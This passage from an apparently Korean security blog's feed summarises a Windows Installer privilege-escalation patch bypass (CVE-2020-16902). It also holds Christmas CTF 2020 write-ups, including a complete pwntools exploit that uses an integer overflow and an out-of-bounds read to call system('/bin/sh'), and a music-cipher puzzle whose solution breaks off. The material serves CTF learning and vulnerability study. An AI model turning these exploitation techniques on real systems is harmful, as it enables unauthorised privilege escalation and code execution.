    <url>/2020/12/30/fabu1ous/2020-12-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>&#xC5D0; &#xB300;&#xD55C; &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xAC00; &#xACF5;&#xAC1C;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. CVE-2019-1415&#xB85C; &#xCC98;&#xC74C; &#xC81C;&#xBCF4;&#xB41C; Windows Installer EoP &#xCDE8;&#xC57D;&#xC810;&#xC758; 6&#xBC88;&#xC9F8; &#xD328;&#xCE58; &#xC6B0;&#xD68C;&#xC785;&#xB2C8;&#xB2E4;. </p><p>CVE-2020-16902&#xC758; &#xB0B4;&#xC6A9;&#xC740; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;. Windows Installer&#xB294; &#xC124;&#xCE58; &#xC791;&#xC5C5; &#xC2E4;&#xD328;&#xB97C; &#xB300;&#xBE44;&#xD574; &#xC124;&#xCE58; &#xC791;&#xC5C5; &#xC911; &#xC0AD;&#xC81C;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xACFC; &#xB864;&#xBC31; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C;<code>C:\Config.Msi</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xC5D0; &#xBC31;&#xC5C5;&#xD569;&#xB2C8;&#xB2E4;. &#xBC31;&#xC5C5; &#xC804;&#xC5D0; <code>C:\Config.Msi</code> &#xB514;&#xB809;&#xD130;&#xB9AC;&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; &#xC7AC;&#xC0DD;&#xC131;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC788;&#xB294;&#xB370; <code>Setsecurity()</code>&#xC758; race condition &#xCDE8;&#xC57D;&#xC810; &#xD328;&#xD134;&#xC774; &#xB0A8;&#xC544;&#xC788;&#xC5B4; &#xC545;&#xC6A9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xB530;&#xB77C;&#xC11C; <code>C:\Config.Msi</code>&#xB97C; &#xC0AD;&#xC81C;&#xD558;&#xACE0; <code>C:\Config.Msi</code>&#xC774; &#xC5EC;&#xC804;&#xD788; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;&#xBA74;(race-con &#xD2B8;&#xB9AC;&#xAC70; &#xC870;&#xAC74;) <code>C:\Config.Msi</code> &#xB300;&#xC2E0; <code>C:\windows\install\config.msi</code>&#xC5D0; &#xB864;&#xBC31; &#xD30C;&#xC77C;&#xC744; &#xBC31;&#xC5C5;&#xD558;&#xB3C4;&#xB85D; &#xD328;&#xCE58;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC774;&#xC720;&#xB85C; &#xC6B0;&#xD68C;&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xAC00; &#xC874;&#xC7AC;&#xD558;&#xBA74; &#xADF8;&#xB300;&#xB85C; <code>C:\Config.Msi</code>&#xB97C; &#xBC31;&#xC5C5;&#xC5D0; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;.  <code>C:\Config.Msi</code>&#xB97C; &#xC0AD;&#xC81C;&#xD55C; &#xD6C4; <code>C:\Config.Msi</code>&#xC758; &#xC0AD;&#xC81C; &#xC5EC;&#xBD80;&#xB97C; &#xD55C;&#xBC88; &#xB354; &#xCCB4;&#xD06C;&#xD55C; &#xB2E4;&#xC74C; <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xB97C; &#xC0AD;&#xC81C;&#xD569;&#xB2C8;&#xB2E4;.  <code>C:\Config.Msi</code>&#xAC00; &#xC0AD;&#xC81C;&#xB41C; &#xC9C1;&#xD6C4; <code>C:\Config.Msi</code>&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xBA74; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xAC00; &#xC0AD;&#xC81C;&#xB418;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;. Windows Installer&#xB294; <code>C:\Config.Msi</code>&#xB97C; &#xBC31;&#xC5C5;&#xC5D0; &#xC0AC;&#xC6A9;&#xD558;&#xAC8C; &#xB418;&#xACE0; &#xC774;&#xC804; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xADF8;&#xB300;&#xB85C; &#xC545;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>eop</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>race condition</tag>
      
      <tag>toctou</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
    <link href="/2020/12/29/fabu1ous/match-maker/"/>
    <url>/2020/12/29/fabu1ous/match-maker/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBB38;&#xC81C;-&#xAC1C;&#xC694;"><a href="#&#xBB38;&#xC81C;-&#xAC1C;&#xC694;" class="headerlink" title="&#xBB38;&#xC81C; &#xAC1C;&#xC694;"></a>&#xBB38;&#xC81C; &#xAC1C;&#xC694;</h1><p><img src="/2020/12/29/fabu1ous/match-maker/1.png" alt></p><ol><li><p>&#xD504;&#xB85C;&#xD544;&#xC744; &#xB9CC;&#xB4ED;&#xB2C8;&#xB2E4;.</p><ul><li>&#xC774;&#xB984;, &#xB098;&#xC774;, &#xC131;&#xBCC4;, &#xCDE8;&#xBBF8;&#xB97C; &#xC785;&#xB825;</li><li>&#xB098;&#xC774; &#xC815;&#xBCF4;&#xC5D0; &#xB530;&#xB77C; &#xD30C;&#xD2B8;&#xB108; &#xB9E4;&#xCE6D; &#xD568;&#xC218;&#xAC00; &#xB2EC;&#xB77C;&#xC9D0;</li></ul></li><li><p>&#xB9CC;&#xB4E0; &#xD504;&#xB85C;&#xD544;&#xC744; &#xC800;&#xC7A5;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xD504;&#xB85C;&#xD544;&#xC744; &#xD799;&#xC5D0; &#xC800;&#xC7A5;</li><li>&#xC131;&#xBCC4;&#xC744; &#xAD6C;&#xBD84;&#xD558;&#xC5EC; &#xC804;&#xC5ED; &#xBC30;&#xC5F4;&#xC5D0; &#xD799; &#xC8FC;&#xC18C; &#xC800;&#xC7A5;.</li></ul></li><li><p>&#xD30C;&#xD2B8;&#xB108; &#xB9E4;&#xCE6D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xB9E4;&#xCE6D; &#xB41C; &#xD30C;&#xD2B8;&#xB108;&#xC758; &#xC815;&#xBCF4;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p></li><li><p>&#xC720;&#xC800; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCD9C;&#xB825;&#xD569;&#xB2C8;&#xB2E4;.</p><ul><li>&#xD604;&#xC7AC; &#xD504;&#xB85C;&#xD544;&#xC774; &#xB0A8;&#xC790;&#xBA74; &#xC5EC;&#xC790; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCD9C;&#xB825;</li><li>&#xD604;&#xC7AC; &#xD504;&#xB85C;&#xD544;&#xC774; &#xC5EC;&#xC790;&#xBA74; &#xB0A8;&#xC790; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCD9C;&#xB825;</li></ul></li></ol><h1 id="&#xD480;&#xC774;-&#xC694;&#xC57D;"><a href="#&#xD480;&#xC774;-&#xC694;&#xC57D;" class="headerlink" title="&#xD480;&#xC774; &#xC694;&#xC57D;"></a>&#xD480;&#xC774; &#xC694;&#xC57D;</h1><p>find match &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xD560; &#xC54C;&#xACE0;&#xB9AC;&#xC998;&#xC744; &#xC815;&#xD558;&#xB294; &#xB85C;&#xC9C1;&#xC774; &#xC874;&#xC7AC;&#xD569;&#xB2C8;&#xB2E4;. pref_min_age != pref_max_age&#xC774;&#xBA74;&#xC11C; pref_min_age ^ 2 == pref_max_age ^ 2 &#xC77C; &#xB54C; &#xCD08;&#xAE30;&#xD654;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xC2A4;&#xD0DD;&#xC758; &#xC4F0;&#xB808;&#xAE30; &#xAC12;&#xC73C;&#xB85C; rip&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. int-overflow&#xB97C; &#xD65C;&#xC6A9;&#xD558;&#xBA74; &#xB429;&#xB2C8;&#xB2E4;.</p><p>show user list &#xAE30;&#xB2A5;&#xC5D0;&#xC11C; user list&#xB97C; &#xCC38;&#xC870;&#xD560; &#xB54C; sex ^1&#xC744; index&#xB85C; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xD504;&#xB85C;&#xD544; &#xC791;&#xC131; &#xC2DC; &#xC131;&#xBCC4; &#xC785;&#xB825;&#xAC12;&#xC5D0; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC774;&#xB97C; &#xC774;&#xC6A9;&#xD574; &#xBC14;&#xC774;&#xB108;&#xB9AC; base&#xC8FC;&#xC18C;&#xC640; libc base &#xC8FC;&#xC18C;&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="&#xCDE8;&#xC57D;&#xC810;"><a href="#&#xCDE8;&#xC57D;&#xC810;" class="headerlink" title="&#xCDE8;&#xC57D;&#xC810;"></a>&#xCDE8;&#xC57D;&#xC810;</h1><ul><li>int overflow &#x2192; uninitialized stack</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/2.png" alt></p><p>&#xD504;&#xB85C;&#xD544; &#xC0DD;&#xC131; &#xBA54;&#xB274;&#xC5D0;&#xC11C; &#xC785;&#xB825;&#xBC1B;&#xC740; &#xB098;&#xC774; &#xC815;&#xBCF4;&#xB97C; &#xD1A0;&#xB300;&#xB85C; &#xD30C;&#xD2B8;&#xB108; &#xB9E4;&#xCE6D; &#xB8E8;&#xD2F4;&#xC744; &#xC815;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;. if&#x2026;else&#xAC00; &#xC544;&#xB2CC; if&#x2026;if &#xC774;&#xBBC0;&#xB85C; integer overflow&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; <code>(void*)func()</code>&#xC758; &#xAC12;&#xC744; &#xC2A4;&#xD0DD;&#xC5D0; &#xC788;&#xB358; &#xC4F0;&#xB808;&#xAE30; &#xAC12;&#xC73C;&#xB85C; &#xC124;&#xC815;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/fabu1ous/match-maker/3.png" alt></p><p>&#xC5F0;&#xC0C1; &#xD639;&#xC740; &#xC5F0;&#xD558; &#xC911; &#xC120;&#xD638;&#xD558;&#xB294; &#xCABD;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xB294; &#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; &#xC808;&#xB313;&#xAC12;&#xC744; &#xC0AC;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC785;&#xB825;&#xD560; &#xC218; &#xC788;&#xB294; &#xB098;&#xC774;&#xC5D0; &#xCD5C;&#xB313;&#xAC12; &#xC81C;&#xD55C;&#xC774; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; int overflow&#xB97C; &#xBC1C;&#xC0DD;&#xC2DC;&#xCF1C; &#xC2A4;&#xD0DD; &#xBCC0;&#xC218; <code>(void*)func()&#xB97C;</code> &#xCD08;&#xAE30;&#xD654;&#xD558;&#xB294; &#xC791;&#xC5C5;&#xC744; &#xAC74;&#xB108;&#xB6F8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/fabu1ous/match-maker/4.png" alt></p><p><code>(void*)func()</code>&#xAC12;&#xC5D0; &#xC601;&#xD5A5;&#xC744; &#xBBF8;&#xCE58;&#xB294; &#xC4F0;&#xB808;&#xAE30; &#xAC12;&#xC740; name&#xC744; &#xC785;&#xB825;&#xBC1B;&#xC744; &#xB54C; &#xC0AC;&#xC6A9;&#xD558;&#xB358; &#xBC84;&#xD37C;&#xC785;&#xB2C8;&#xB2E4;.</p><p><img src="/2020/12/29/fabu1ous/match-maker/5.png" alt></p><p>&#xBA54;&#xC778; &#xBA54;&#xB274;&#xC5D0;&#xC11C; find match&#xB97C; &#xC120;&#xD0DD;&#xD558;&#xBA74; rip&#xAC00; &#xC7A1;&#xD788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li>out of bound read</li></ul><p><img src="/2020/12/29/fabu1ous/match-maker/6.png" alt></p><p>&#xC131;&#xBCC4;&#xC740; int&#xB85C; &#xC785;&#xB825;&#xBC1B;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>0 : &#xB0A8;&#xC790;</p><p>1 : &#xC5EC;&#xC790;</p><p><img src="/2020/12/29/fabu1ous/match-maker/7.png" alt></p><p>&#xD604;&#xC7AC; &#xD504;&#xB85C;&#xD544;&#xC774; &#xB0A8;&#xC790;&#xBA74; &#xC5EC;&#xC790; &#xC720;&#xC800; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C;, &#xC5EC;&#xC790;&#xBA74; &#xB0A8;&#xC790; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xCD9C;&#xB825;&#xD574;&#xC8FC;&#xB294; &#xD568;&#xC218;&#xC785;&#xB2C8;&#xB2E4;. 0&#xB3C4; 1&#xB3C4; &#xC544;&#xB2CC; &#xB2E4;&#xB978; &#xAC12;&#xC744; &#xC131;&#xBCC4;&#xB85C; &#xC785;&#xB825;&#xD558;&#xBA74; oob-read&#xAC00; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. binary&#xC758; base&#xC8FC;&#xC18C;, libc&#xC758; base&#xC8FC;&#xC18C;&#xB97C; leak &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h1 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h1><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*p = process(<span class="hljs-string">&apos;./match&apos;</span>)<span class="hljs-comment">#gdb.attach(p)</span><span class="hljs-comment">#context.log_level=&apos;debug&apos;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make</span>(<span class="hljs-params">age, name, Pmin, Pmax, sex</span>):</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;0&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;age: &apos;</span>, age)p.sendlineafter(<span class="hljs-string">&apos;name: &apos;</span>, name)p.sendlineafter(<span class="hljs-string">&apos;min age limit for you: &apos;</span>, Pmin)p.sendlineafter(<span class="hljs-string">&apos;max age limit for you: &apos;</span>, Pmax)p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, sex)p.sendlineafter(<span class="hljs-string">&apos;enter hobby 1 : &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;enter hobby 2 : &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)p.sendlineafter(<span class="hljs-string">&apos;enter hobby 3 : &apos;</span>, <span class="hljs-string">&apos;3&apos;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">save</span>():</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;1&apos;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">find</span>():</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;2&apos;</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">showL</span>():</span>p.sendlineafter(<span class="hljs-string">&apos;&gt; &apos;</span>, <span class="hljs-string">&apos;4&apos;</span>)<span class="hljs-comment"># leak bin base</span>make(<span class="hljs-string">&apos;65536&apos;</span>, <span class="hljs-string">b&apos;A&apos;</span>*<span class="hljs-number">16</span>+<span class="hljs-string">b&apos;BBBBBBBB&apos;</span>, <span class="hljs-string">&apos;0&apos;</span>, <span class="hljs-string">&apos;196608&apos;</span>, <span class="hljs-string">&apos;-2&apos;</span>)showL()p.recvuntil(<span class="hljs-string">&apos;[potential partners]\\n0. &apos;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&apos;\\x00\\x00&apos;</span>)bin_base = leak - <span class="hljs-number">0x5008</span>log.info(hex(bin_base))<span class="hljs-comment"># leak read@libc</span>make(<span class="hljs-string">&apos;65536&apos;</span>, p64(bin_base+<span class="hljs-number">0x4fa0</span>)+<span class="hljs-string">b&apos;BBBBBBBBCCCCCCCC&apos;</span>, <span class="hljs-string">&apos;0&apos;</span>, <span class="hljs-string">&apos;196608&apos;</span>, <span class="hljs-string">&apos;23&apos;</span>)save()showL()p.recvuntil(<span class="hljs-string">&apos;[potential partners]\\n0. &apos;</span>)leak = u64(p.recv(<span class="hljs-number">6</span>)+<span class="hljs-string">b&apos;\\x00\\x00&apos;</span>)system = leak - <span class="hljs-number">0xbbd20</span>log.info(hex(system))make(<span class="hljs-string">&apos;65536&apos;</span>, <span class="hljs-string">b&apos;/bin/sh;&apos;</span>+<span class="hljs-string">b&apos;B&apos;</span>*<span class="hljs-number">8</span>+p64(system), <span class="hljs-string">&apos;0&apos;</span>, <span class="hljs-string">&apos;196608&apos;</span>, <span class="hljs-string">&apos;23&apos;</span>)find()p.interactive()</code></pre><pre><code class="hljs plain">[+] Opening connection to localhost on port 1234: Done[*] 0x55ad3a345000[*] 0x7f414a9ec410[*] Switching to interactive mode$ cat flagXMAS{1_d0n7_w4nna_kn0w_who&apos;5_tak1ng_U_h0me}</code></pre>]]></content>
    
    
    <categories>
      
      <category>Write-Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>oob</tag>
      
      <tag>Fabu1ous</tag>
      
      <tag>integer overflow</tag>
      
      <tag>pwnable</tag>
      
      <tag>uninitialized stack</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - No g</title>
    <link href="/2020/12/29/fabu1ous/no-g/"/>
    <url>/2020/12/29/fabu1ous/no-g/</url>
    
    <content type="html"><![CDATA[<h1 id="&#xBB38;&#xC81C;-&#xAC1C;&#xC694;"><a href="#&#xBB38;&#xC81C;-&#xAC1C;&#xC694;" class="headerlink" title="&#xBB38;&#xC81C; &#xAC1C;&#xC694;"></a>&#xBB38;&#xC81C; &#xAC1C;&#xC694;</h1><p><img src="/2020/12/29/fabu1ous/no-g/1.png" alt></p><p>&#xC74C;&#xACC4;(Scale)&#xB97C; &#xC54C;&#xD30C;&#xBCB3;&#xC73C;&#xB85C; &#xB098;&#xD0C0;&#xB0B4;&#xACE4; &#xD569;&#xB2C8;&#xB2E4;. &#xC74C;&#xC774;&#xB984;&#xC774;&#xB77C;&#xACE0; &#xD558;&#xC8E0;.</p><p>&#xB77C;(A), &#xC2DC;(B), &#xB3C4;(C), &#xB808;(D), &#xBBF8;(E) , &#xD30C;(F), &#xC194;(G)</p><p>16&#xC9C4;&#xC218;(HEX) &#xB610;&#xD55C; &#xC54C;&#xD30C;&#xBCB3;&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC218;&#xB97C; &#xD45C;&#xD604;&#xD569;&#xB2C8;&#xB2E4;.</p><p>10(A), 11(B), 12(C), 13(D), 14(E), 15(F)</p><p><img src="/2020/12/29/fabu1ous/no-g/hint.jpg" alt></p><p>&#xC545;&#xBCF4;&#xC5D0; &#xADF8;&#xB824;&#xC9C4; &#xC74C;&#xD45C;&#xB97C; &#xC54C;&#xD30C;&#xBCB3;&#xC73C;&#xB85C;, &#xADF8; &#xC54C;&#xD30C;&#xBCB3;&#xC744; hex&#xAC12;&#xC73C;&#xB85C; &#xCE58;&#xD658;&#xD558;&#xACE0; &#xC5F0;&#xACB0;&#xB41C; &#xC74C;&#xD45C;&#xB4E4;&#xB07C;&#xB9AC; hex&#xAC12;&#xC744; &#xB354;&#xD574; ASCII&#xB85C; &#xBCC0;&#xD658;&#xD558;&#xBA74; &#xD558;&#xB098;&#xC758; &#xBB38;&#xC790;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608; ) &#xB77C;&#xB77C;&#xB77C; &#x2192; chr(0xa+0xa+0xa) &#x2192; &#x2018;\x1e&#x2019;</p><p>hex&#xC5D0;&#xB294; G&#xAC00; &#xC5C6;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC545;&#xBCF4;&#xC758; &#xC81C;&#xBAA9;&#xC774; &#x2018;No G&#x2019;&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xC81C;&#xAC00; &#xC758;&#xB3C4;&#xD55C; &#xD480;&#xC774; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xC740; &#xC774;&#xB807;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ol><li>&#xC81C;&#xBAA9;&#xC5D0;&#xC11C; &#xD78C;&#xD2B8;&#xB97C; &#xC5BB;&#xC5B4; &#xC74C;&#xC774;&#xB984;&#xC744; &#xCC3E;&#xC544;&#xBCF8;&#xB2E4;.</li><li>&#xCCAB; &#xC5EC;&#xC12F; &#xC74C;&#xC758; hex&#xAC12;&#xC744; &#xB354;&#xD574;&#xBD24;&#xB354;&#xB2C8; &#x2018;X&#x2019;&#xAC00; &#xB098;&#xC628;&#xB2E4;.</li><li>flag &#xD615;&#xC2DD;&#xC774; &#x2018;XMAS{}&#x2019;&#xC774;&#xBBC0;&#xB85C; 2&#xBC88; &#xACFC;&#xC815;&#xC744; &#xBA87; &#xBC88; &#xB354; &#xBC18;&#xBCF5;&#xD574; &#xBCF8;&#xB2E4;.</li></ol><h1 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h1><pre><code class="hljs python">note = [<span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;fa&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;mi&apos;</span>, <span class="hljs-string">&apos;ti&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;do&apos;</span>, <span class="hljs-string">&apos;re&apos;</span>, <span class="hljs-string">&apos;la&apos;</span>, <span 